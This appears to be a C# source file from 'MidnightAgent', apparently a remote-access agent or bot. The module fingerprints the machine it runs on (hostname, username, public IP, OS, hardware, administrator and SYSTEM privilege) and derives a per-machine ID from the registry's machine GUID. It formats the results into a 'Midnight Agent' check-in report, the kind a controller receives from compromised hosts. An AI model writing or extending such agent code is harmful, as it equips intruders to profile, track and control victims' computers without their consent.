using System;
using System.Management;
using System.Net;
using System.Security.Principal;
using MidnightAgent.Helpers;
using MidnightAgent.Installation;

namespace MidnightAgent.Core
{
    /// <summary>
    /// Agent information for identification
    /// </summary>
    public static class AgentInfo
    {
        private static string _id;
        private static readonly object _lock = new object();

        /// <summary>
        /// Unique Agent ID (generated once)
        /// </summary>
        public static string Id
        {
            get
            {
                if (_id == null)
                {
                    lock (_lock)
                    {
                        if (_id == null)
                        {
                            _id = GenerateId();
                        }
                    }
                }
                return _id;
            }
        }

        public static string Hostname => Environment.MachineName;
        public static string Username => Environment.UserName;
        public static string OS
        {
            get
            {
                try
                {
                    using (var searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
                    {
                        foreach (ManagementObject obj in searcher.Get())
                        {
                            return obj["Caption"]?.ToString() ?? Environment.OSVersion.ToString();
                        }
                    }
                }
                catch { }
                return Environment.OSVersion.ToString();
            }
        }

        public static string RAM
        {
            get
            {
                try
                {
                    using (var searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                    {
                        foreach (ManagementObject obj in searcher.Get())
                        {
                            double totalMemory = Convert.ToDouble(obj["TotalPhysicalMemory"]);
                            return $"{Math.Round(totalMemory / (1024 * 1024 * 1024), 1)} GB";
                        }
                    }
                }
                catch { }
                return "Unknown";
            }
        }

        public static string HDD
        {
            get
            {
                try
                {
                    var driveInfo = new System.Collections.Generic.List<string>();
                    foreach (var drive in System.IO.DriveInfo.GetDrives())
                    {
                        if (drive.IsReady && drive.DriveType == System.IO.DriveType.Fixed)
                        {
                            long totalSize = drive.TotalSize;
                            long freeSpace = drive.AvailableFreeSpace;
                            long usedSpace = totalSize - freeSpace;
                            double usedPercent = (double)usedSpace / totalSize * 100;
                            
                            string sizeStr = totalSize > 1024L * 1024 * 1024 * 1024 
                                ? $"{Math.Round(totalSize / (1024.0 * 1024 * 1024 * 1024), 1)} TB"
                                : $"{Math.Round(totalSize / (1024.0 * 1024 * 1024), 1)} GB";

                            driveInfo.Add($"{drive.Name} ({sizeStr}) {Math.Round(usedPercent, 0)}% Used");
                        }
                    }
                    return string.Join("\n     ", driveInfo);
                }
                catch { }
                return "Unknown";
            }
        }

        public static string Bits => Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit";
        public static string Version => Config.FullVersion;
        
        public static bool IsAdmin => PrivilegeHelper.IsAdmin();
        public static bool IsSystem => PrivilegeHelper.IsSystem();

        public static string IP
        {
            get
            {
                try
                {
                    return NetworkHelper.GetPublicIP();
                }
                catch
                {
                    return "Unknown";
                }
            }
        }

        public static string CPU
        {
            get
            {
                try
                {
                    using (var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor"))
                    {
                        foreach (ManagementObject obj in searcher.Get())
                        {
                            return obj["Name"]?.ToString() ?? "Unknown";
                        }
                    }
                }
                catch { }
                return "Unknown";
            }
        }

        /// <summary>
        /// Get full system info message
        /// </summary>
        public static string GetFullInfo()
        {
            string nick = GetNickname();
            string idDisplay = string.IsNullOrEmpty(nick) ? $"#{Id}" : $"#{Id} ({nick})";

            return $@"🌙 Midnight Agent {idDisplay}

🖥️ Hostname: {Hostname}
👤 Username: {Username}
🌐 IP: {IP}
💻 OS: {OS}
📊 Bits: {Bits}
🔧 CPU: {CPU}
🧠 RAM: {RAM}
💾 HDD: {HDD}
🔐 Admin: {(IsAdmin ? "Yes ✅" : "No ❌")}
⚡ SYSTEM: {(IsSystem ? "Yes ✅" : "No ❌")}
📦 Version: {Version}";
        }

        private static string GetNickname()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\InputPersonalization"))
                {
                    return key?.GetValue("UserTag")?.ToString();
                }
            }
            catch { return null; }
        }

        private static string GenerateId()
        {
            // Generate based on machine GUID
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                {
                    if (key != null)
                    {
                        string guid = key.GetValue("MachineGuid")?.ToString();
                        if (!string.IsNullOrEmpty(guid))
                        {
                            // Take first 8 chars
                            return guid.Replace("-", "").Substring(0, 8).ToUpper();
                        }
                    }
                }
            }
            catch { }

            // Fallback: random ID
            return new Random().Next(10000000, 99999999).ToString();
        }
    }
}
